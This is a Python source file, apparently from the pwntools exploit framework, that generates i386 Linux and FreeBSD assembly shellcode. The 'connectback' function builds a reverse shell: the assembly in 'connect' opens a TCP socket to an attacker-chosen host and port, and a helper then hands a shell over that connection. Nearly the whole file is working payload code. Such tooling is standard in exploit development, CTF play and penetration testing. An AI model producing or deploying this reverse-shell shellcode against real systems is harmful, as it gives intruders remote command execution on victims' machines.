from pwn.internal.shellcode_helper import *
from .. import dupsh

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network='ipv4')
def connectback(host, port):
    """Args: host, port
    Standard connect back type shellcode."""
    return connect(host, port), dupsh()

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network='ipv4')
def connect(host, port, os = None):
    """Args: host, port
    Connects to host on port.  Leaves socket in EBP."""

    if os == 'linux':
        return """
            ;; Connect to %(hostname)s on %(portnum)d
            ;; Socket file descriptor is placed in EBP

            ;; sock = socket(AF_INET, SOCK_STREAM, 0)
            push SYS_socketcall
            pop eax
            push SYS_socketcall_socket
            pop ebx
            cdq                     ; clear EDX
            push edx                ; IPPROTO_IP (= 0)
            push ebx                ; SOCK_STREAM
            push AF_INET
            mov ecx, esp
            int 0x80

            mov ebp, eax

            ;; connect(sock, &addr, sizeof addr); // sizeof addr == 0x10
            push %(host)d
            push word %(port)d
            push word AF_INET
            mov ecx, esp
            push 0x10               ; sizeof addr (= 0x10)
            push ecx                ; &addr
            push eax                ; sock
            mov ecx, esp            ; args
            inc ebx
            inc ebx                 ; EBX = connect (= 3)
            mov al, SYS_socketcall
            int 0x80
""" % {'hostname': host,
       'portnum' : int(port),
       'host'    : ip(host),
       'port'    : htons(int(port))
       }
    elif os == 'freebsd':
        return """
            ;; Connect to %(hostname)s on %(portnum)d
            ;; Socket file descriptor is placed in EBP

            ;; sock = socket(AF_INET, SOCK_STREAM, 0)
            push SYS_socket
            pop eax
            cdq
            push edx
            push SOCK_STREAM
            push AF_INET
            push edx
            int 0x80

            mov ebp, eax

            ;; connect(sock, &addr, sizeof addr); // sizeof addr == 0x10
            push %(host)d
            push 0x10 | (AF_INET << 8) | (%(port)d << 16) ;; sa_len and sa_family does't really matter, but why not set them right?
            mov ebx, esp
            push 0x10
            push ebx
            push eax
            push eax
            mov al, SYS_connect
            int 0x80
""" % {'hostname': host,
       'portnum' : int(port),
       'host'    : ip(host),
       'port'    : htons(int(port))
       }
    else:
        bug('OS was neither linux nor freebsd')
